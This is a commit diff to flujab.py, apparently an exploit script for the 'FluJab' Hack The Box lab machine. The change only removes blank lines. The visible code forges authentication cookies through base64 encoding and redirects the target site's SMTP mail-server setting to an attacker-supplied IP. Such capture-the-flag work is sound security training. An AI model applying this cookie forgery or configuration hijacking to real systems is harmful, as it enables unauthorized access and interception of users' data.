154bd740a796b7852b261bb48c17c40b363d24e7
aust1n <47215311+mlcsec@users.noreply.github.com>
2020-07-21 11:41:19 +0100

    Update flujab.py

--- flujab.py
+++ flujab.py
@@ -7,9 +7,7 @@ import sys
 import requests
 import base64
 import subprocess
-
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 if len(sys.argv) !=3:
@@ -19,21 +17,15 @@ if len(sys.argv) !=3:
 ip = sys.argv[1]
 patient_cookie = sys.argv[2]
 
-
 true = "=True"
 add_true = patient_cookie + true
-
 b64_add_true = bytes(add_true)
 b64_registered = base64.b64encode(b64_add_true)
-
 b64_registered = b64_registered.replace('=','%3D')
-
 cookie_1 = {'Modus':'Q29uZmlndXJlPVRydWU%3D'}   # /?smtp_config
 cookie_2 = {'Modus': 'Q29uZmlndXJlPVRydWU%3D','Registered': b64_registered}   # /?cancel
-
 requests.get("https://freeflujab.htb/?smtp_config", cookies=cookie_1, verify=False)  # enter smtp config
 requests.post("https://freeflujab.htb/?smtp_config", cookies=cookie_1, data={'mailserver': ip, 'port': '25', 'save':'Save+Mail+Server+Config'}, verify=False)
-
 
 class flu(object):
         def __init__(self):
